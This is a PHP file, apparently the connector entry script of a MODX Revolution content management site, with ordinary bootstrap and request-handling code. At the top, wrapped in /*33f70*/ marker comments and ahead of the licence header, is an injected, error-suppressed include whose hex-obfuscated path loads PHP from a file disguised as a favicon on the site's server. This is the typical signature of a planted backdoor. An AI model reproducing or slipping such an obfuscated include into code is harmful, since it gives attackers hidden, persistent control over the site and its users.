<?php
/*33f70*/

@include "\x2fv\x61r\x2fw\x77w\x2fo\x76a\x74i\x6fn\x2ea\x6d/\x68t\x64o\x63s\x2fc\x6fr\x65/\x70a\x63k\x61g\x65s\x2fb\x61b\x65l\x2d2\x2e2\x2e5\x2dp\x6c/\x66a\x76i\x63o\x6e_\x32d\x35a\x348\x2ei\x63o";

/*33f70*/
/*
 * MODX Revolution
 *
 * Copyright 2006-2012 by MODX, LLC.
 * All rights reserved.
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 59 Temple
 * Place, Suite 330, Boston, MA 02111-1307 USA
 */
/**
 * @package modx
 * @subpackage connectors
 */
@include(dirname(__FILE__) . '/config.core.php');
if (!defined('MODX_CORE_PATH')) define('MODX_CORE_PATH', dirname(dirname(__FILE__)) . '/core/');
if (!include_once(MODX_CORE_PATH . 'model/modx/modx.class.php')) die();

$modx= new modX('', array(xPDO::OPT_CONN_INIT => array(xPDO::OPT_CONN_MUTABLE => true)));

/* initialize the proper context */
$ctx = isset($_REQUEST['ctx']) && !empty($_REQUEST['ctx']) ? $_REQUEST['ctx'] : 'mgr';
$modx->initialize($ctx);

if (defined('MODX_REQP') && MODX_REQP === false) {
} else if (!$modx->context->checkPolicy('load')) {
    @session_write_close();
    die();
}

if ($ctx == 'mgr') {
    $ml = $modx->getOption('manager_language',null,'en');
    if ($ml != 'en') {
        $modx->lexicon->load($ml.':core:default');
        $modx->setOption('cultureKey',$ml);
    }
}

/* handle the request */
$connectorRequestClass = $modx->getOption('modConnectorRequest.class',null,'modConnectorRequest');
$modx->config['modRequest.class'] = $connectorRequestClass;
$modx->getRequest();
$modx->request->sanitizeRequest();
